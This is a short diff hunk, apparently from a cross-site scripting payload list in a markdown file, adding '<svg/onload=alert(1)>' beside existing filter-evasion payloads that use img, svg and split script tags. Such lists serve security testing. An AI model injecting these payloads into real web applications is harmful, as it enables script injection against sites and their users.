@@ -68,6 +68,8 @@ flkdflkjslkf"><img%20src=x%20onmouseover=confirm(1)>
 <svg onload="javascript:window.onerror=confirm;throw 10">
     
 <scr<h1>ipt>document.write("<img src=x onerror=confirm(1);>");</scr<h1>ipt>
+
+<svg/onload=alert(1)>
     
 ```
 
